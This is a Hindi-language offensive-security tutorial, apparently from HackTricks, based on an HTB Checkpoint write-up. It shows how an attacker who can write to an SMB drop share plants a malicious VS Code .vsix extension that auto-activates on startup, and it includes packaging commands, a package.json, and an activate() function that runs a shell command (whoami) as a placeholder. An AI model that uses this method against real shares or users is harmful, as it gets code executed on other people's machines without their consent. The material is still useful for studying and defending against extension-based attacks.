# VS Code Extension Drop-Share Execution

{{#include ../banners/hacktricks-training.md}}

VS Code extensions और Visual Studio VSSDK extensions, दोनों `.vsix` packaging का उपयोग करते हैं, लेकिन उनके manifests और runtimes अलग-अलग होते हैं। Writable SMB drop share execution path **तभी बनता है जब** कोई दूसरा user या deployment job उसके packages को VS Code में install करे। इसके बाद extension का `activate()` function उस user के privileges के साथ extension host में चलता है। केवल `.vsix` को share पर लिखने से वह execute नहीं होता।<sup>[[1]](#references)[[2]](#references)</sup>

## Package और activation workflow

सबसे पहले, उपयोग किए जा रहे VS Code version की पुष्टि करें और सुनिश्चित करें कि share वास्तव में synchronized या installed है। TypeScript extension generate करें और इच्छित Node.js action को `activate()` में रखें। ऐसा activation event चुनें जो user द्वारा command चुनने के बिना चलता हो, जैसे `onStartupFinished`; फिर extension को compile और package करें। `engines.vscode` **runtime compatibility gate** है; `@types/vscode` को target API version से match करना build-time compatibility का उपाय है, install-time requirement नहीं।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

VS Code 1.118 चलाने वाले संपादक के लिए, संबंधित `package.json` फ़ील्ड हैं:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

एक न्यूनतम `activate()` जाँच extension host से कोई command चला सकती है और उसका output लॉग कर सकती है। test action को तभी बदलें, जब यह सत्यापित कर लें कि package अपेक्षित account/session में activate हुआ है। `onStartupFinished` event startup के बाद चलता है, इसलिए जब तक editor वास्तव में शुरू न हो जाए और extension install तथा enable न हो, तब तक यह execution का प्रमाण नहीं है।<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

drop share पर write access रखने वाला attacker tested package अपलोड करके consuming job का इंतज़ार कर सकता है। Checkpoint के उदाहरण में, restored account के share access से यह write access मिला; कम विशेषाधिकार वाले शुरुआती account के पास share पर केवल read access था। इन दोनों prerequisites को अलग-अलग रखें। **Visual Studio** extensions के लिए, इस VS Code workflow के बजाय अलग [Visual Studio VSIX extension abuse](visual-studio-vsix-extension-abuse.md) अध्याय देखें।<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - सक्रियण इवेंट्स](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Extensions प्रकाशित करना](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
